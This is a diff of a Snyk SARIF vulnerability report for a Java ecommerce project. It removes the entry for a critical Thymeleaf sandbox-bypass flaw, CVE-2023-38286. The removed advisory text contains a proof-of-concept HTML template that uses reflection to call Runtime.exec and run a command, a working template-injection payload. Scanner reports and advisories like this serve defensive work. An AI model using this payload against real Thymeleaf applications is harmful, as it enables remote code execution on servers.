@@ -10,7 +10,7 @@
           "version": "1.1297.1",
           "informationUri": "https://docs.snyk.io/",
           "properties": {
-            "artifactsScanned": 544
+            "artifactsScanned": 542
           },
           "rules": [
             {
@@ -2502,28 +2502,6 @@
                 ],
                 "cvssv3_baseScore": 6.3,
                 "security-severity": "6.3"
-              }
-            },
-            {
-              "id": "SNYK-JAVA-ORGTHYMELEAF-5811866",
-              "shortDescription": {
-                "text": "Critical severity - Sandbox Bypass vulnerability in org.thymeleaf:thymeleaf"
-              },
-              "fullDescription": {
-                "text": "(CVE-2023-38286) org.thymeleaf:thymeleaf@3.0.15.RELEASE"
-              },
-              "help": {
-                "text": "",
-                "markdown": "* Package Manager: maven\n* Vulnerable module: org.thymeleaf:thymeleaf\n* Introduced through: com.gmail.merikbest2015:ecommerce@0.0.1-SNAPSHOT and org.thymeleaf:thymeleaf@3.0.15.RELEASE\n### Detailed paths\n* _Introduced through_: com.gmail.merikbest2015:ecommerce@0.0.1-SNAPSHOT › org.thymeleaf:thymeleaf@3.0.15.RELEASE\n# Overview\n\nAffected versions of this package are vulnerable to Sandbox Bypass due to insufficient checks, by allowing an attacker to execute arbitrary code via a crafted HTML.\n# PoC\n```\r\n<!DOCTYPE html>\r\n<html xmlns:th=\"http://www.thymeleaf.org\">\r\n<head>\r\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\r\n</head>\r\n<body>\r\n\r\n<tr\r\n        th:with=\"getRuntimeMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('java.lang.Runtime',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'getRuntime' )}\"\r\n>\r\n    <td>\r\n        <a\r\n                th:with=\"runtimeObj=${T(org.springframework.util.ReflectionUtils).invokeMethod(getRuntimeMethod, null)}\"\r\n        >\r\n            <a\r\n                    th:with=\"exeMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('java.lang.Runtime',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'exec', ''.getClass() )}\"\r\n            >\r\n                <a\r\n                        th:with=\"param2=${T(org.springframework.util.ReflectionUtils).invokeMethod(exeMethod, runtimeObj, 'calc' )\r\n                }\"\r\n                        th:href=\"${param2}\"\r\n                ></a>\r\n            </a>\r\n\r\n        </a>\r\n    </td>\r\n</tr>\r\n\r\n</body>\r\n</html>\r\n```\n# Remediation\nUpgrade `org.thymeleaf:thymeleaf` to version 3.1.2.RELEASE or higher.\n# References\n- [GitHub Commit](https://github.com/thymeleaf/thymeleaf/issues/966)\n- [PoC](https://github.com/p1n93r/SpringBootAdmin-thymeleaf-SSTI)\n"
-              },
-              "properties": {
-                "tags": [
-                  "security",
-                  "CWE-265",
-                  "maven"
-                ],
-                "cvssv3_baseScore": 9.8,
-                "security-severity": "9.8"
               }
             },
             {
@@ -7524,54 +7502,6 @@
                       },
                       "insertedContent": {
                         "text": "org.springframework.security:spring-security-taglibs@5.7.14"
-                      }
-                    }
-                  ]
-                }
-              ]
-            }
-          ]
-        },
-        {
-          "ruleId": "SNYK-JAVA-ORGTHYMELEAF-5811866",
-          "level": "error",
-          "message": {
-            "text": "This file introduces a vulnerable org.thymeleaf:thymeleaf package with a critical severity vulnerability."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "pom.xml"
-                },
-                "region": {
-                  "startLine": 1
-                }
-              },
-              "logicalLocations": [
-                {
-                  "fullyQualifiedName": "org.thymeleaf:thymeleaf@3.0.15.RELEASE"
-                }
-              ]
-            }
-          ],
-          "fixes": [
-            {
-              "description": {
-                "text": "Upgrade to org.thymeleaf:thymeleaf@3.1.2.RELEASE"
-              },
-              "artifactChanges": [
-                {
-                  "artifactLocation": {
-                    "uri": "pom.xml"
-                  },
-                  "replacements": [
-                    {
-                      "deletedRegion": {
-                        "startLine": 1
-                      },
-                      "insertedContent": {
-                        "text": "org.thymeleaf:thymeleaf@3.1.2.RELEASE"
                       }
                     }
                   ]
